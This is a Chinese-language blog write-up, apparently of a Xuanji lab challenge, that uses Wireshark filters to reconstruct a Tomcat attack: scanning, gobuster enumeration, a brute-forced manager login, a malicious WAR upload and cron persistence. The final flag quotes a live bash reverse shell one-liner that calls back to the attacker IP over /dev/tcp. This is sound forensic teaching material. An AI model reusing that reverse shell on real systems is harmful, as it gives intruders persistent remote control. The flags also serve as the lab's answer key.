---
title: 第六章 流量特征分析-常见攻击事件 tomcat
subtitle:
date: 2025-03-14T14:29:40+08:00
slug: 1008ea3
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 玄机
categories:
  - 玄机
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->

```
1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag{ip}，如：flag{127.0.0.1}
2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}
3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}
4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}
5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123}
6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}
7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息
```

查找恶意扫描，需要确定SYN标志位为 `1`的数据包，确认同一个ip发出大量SYN字段的为攻击者

```
tcp.flags.syn == 1
```

![](images/3255da578c98b68e7c04d1898cd927fa.png)
发现大部分的SYN包来自于`14.0.0.120`
第一问：flag{14.0.0.120}

网站直接查询[IP归属地查询 - 在线工具](https://tool.lu/ip/)
![](images/0e08aabc1a2e6b4917c07c15cfb9cf1a.png)
第二问：flag{guangzhou}

tomacat的默认端口为`8080`，或者过滤查找请求为`200`

```
http contains "200"
```

![](images/42c89dcd79add54ae0098c27d5ea1736.png)
第三问：flag{8080}

过滤ip为`14.0.0.120`的攻击源，并查看`http`报文，过滤GET请求

```
ip.src_host == 14.0.0.120 && http && http.request.method == "GET"
```

![](images/382c9e48b96acab60b9569a8257343ed.png)
第四问：flag{gobuster}

tomcat的管理面板默认路径为`url/manager`

```
ip.src_host == 14.0.0.120 && http.uri contains "/manager"
```

![](images/8269a4fd939d9e9f9a6e952da3c3d7e6.png)
第五问：flag{admin-tomcat}

同上还是这个包，往下翻
![](images/e02482bde4c0e7cb795e940a31339b8c.png)
第六问：flag{JXQOZY.war}

上题题目提到建立了反弹shell，直接过滤

```
ip.src_host == 14.0.0.120 && frame contains "bin/bash"
```

追踪`TCP流`
![](images/d880c73d1c7caa82253985d9d39717ce.png)
攻击者通过`cron -i cron`命令定时反弹shell
第七问：flag{/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'}
